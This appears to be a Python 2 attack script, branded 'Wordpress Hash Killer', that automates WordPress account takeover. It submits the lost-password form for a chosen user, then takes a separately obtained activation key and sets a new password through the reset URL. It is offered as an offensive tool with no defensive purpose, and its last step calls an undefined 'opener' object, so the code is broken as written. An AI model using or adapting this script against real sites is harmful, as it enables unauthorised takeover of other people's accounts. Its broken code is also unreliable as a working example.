#!/usr/bin/env python

import os
import sys
import urllib
import urllib2
import cookielib
import mechanize
from platform import system

logo = """
 _       ______ 
| |     / / __ \  | ----| Wordpress Hash Killer |----
| | /| / / /_/ /  | Autohr : MatriX Coder
| |/ |/ / ____/   | FB : www.fb.com/matrixcoder2
|__/|__/_/        | Blog : www.matrixcoder.co.vu


"""

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')

print logo

url = raw_input('Enter url : ')
user = raw_input('Enter user : ')

# Preparing the url
if 'http://' not in url:
	url = 'http://' + url
if url[-1] != '/':
	url = url + '/' 


br = mechanize.Browser()
cj = cookielib.CookieJar()
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.2.0')]
print url + 'wp-login.php?action=lostpassword'
br.open(url + 'wp-login.php?action=lostpassword')
br.select_form(nr=0)
br.form['user_login'] = user
for ll in br.forms():
    print ll

br.submit()
br.response().read()

actKey = raw_input('Enter activation key : ')
newPass = raw_input('Enter new password : ')
opener.open(url + '?action=rp&key=%s&login=%s' % (actKey, user),{'pass1' : newPass, 'pass2' : newPass} )
print 'Login Please : %s' % url


